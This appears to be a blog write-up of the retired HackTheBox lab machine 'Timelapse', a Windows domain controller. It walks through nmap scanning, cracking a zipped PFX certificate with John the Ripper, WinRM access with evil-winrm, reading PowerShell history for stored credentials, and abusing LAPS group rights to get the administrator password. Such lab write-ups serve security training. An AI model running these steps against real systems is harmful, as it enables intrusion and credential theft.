---
title: "Timelapse"
collection: publications
permalink: /publication/timelapse
excerpt: 'This is a retired machine from HackTheBox'
date: 2023-08-01
venue: '08-01'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/timelapse_header.png)

**LINK:** [Timelapse](https://app.hackthebox.com/machines/Timelapse)

---

## Enumeration : 

Let's scan the target with nmap : 

```bash
# nmap -sV -A -p- 10.10.11.152 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 07:04 EDT
Nmap scan report for 10.10.11.152
Host is up (0.14s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-07-25 19:12:30Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
50548/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

the scan reveals 17 open ports :
 * ``DNS`` on port 53
 * ``Kerberos`` on port 88
 * ``ldap`` on port 389 and his hostaname is timelpase.htb

> these open ports suggest that we're dealing with a domain controller.

* Let's check the ``smb`` shares.

![timelapse1](/images/timelapse1.png)

* There is an only open share named *shares* .

![timelapse2](/images/timelapse2.png)

* there is a zip file for ``winrm``, let's download it to our local machine and unzip it.

![timelapse4](/images/timelapse4.png)

* Unfortunately the zip file is password protected, let's use ``zip2john`` to generate a hash that can be brute forced with ``john the ripper``.

```bash
# zip2john winrm_backup.zip > file.john
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
``` 

* using john to brute force it :

![timelapse5](/images/timelapse5.png)

* Let's unzip the file now.

![timelapse6](/images/timelapse6.png)

> PFX files are digital certificates that contain both the SSL certificate (public keys) and private key. They’re essential for establishing secure connections between two devices.

* In order to extract the certificate and the private key, we should run the following commands :

```bash
# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
# openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pe
```
![timelapse7](/images/timelapse7.png)

* Since we don't have the password, let's convert it to a john hash.

```bash
# pfx2john legacyy_dev_auth.pfx > pfx.john
```

* let's crack it :

![timelapse8](/images/timelapse8.png)

# User Flag :

* After creating the certificate and the key using ``openssl``, let's connect to ``WinRM`` using ``evil-winrm``.

![timelapse9](/images/timelapse9.png)

* Get the user flag. 

# ROOT Flag : 

* Let's check the powershell history file .

```bash
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![timelapse10](/images/timelapse10.png)

* The file contains commands run by the user ``legacyy``, one of the commands was the creds for the user ``svc_deploy``.

* Reconnecting with ``svc_deploy`` creds.

```bash
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'redacted' -S
```

* While i was enumerating, i found that the ``svc_deploy`` user is part of an interesting group.

![timelapse11](/images/timelapse11.png)

> LAPS manages the local admin password, so since we are part of the LAPS_Readers we can read the administrator password.

```bash
Get-ADComputer -identity DC01 -properties *
```

![timelapse12](/images/timelapse12.png)

* Now it's time to reconnect but this time as the ``administrator``.

* The root.txt file was not in the desktop folder.

![timelapse13](/images/timelapse13.png)

* I found another user called ``TRX``, if you check his ``Desktop`` folder you will find the root flag.

![timelapse14](/images/timelapse14.png)



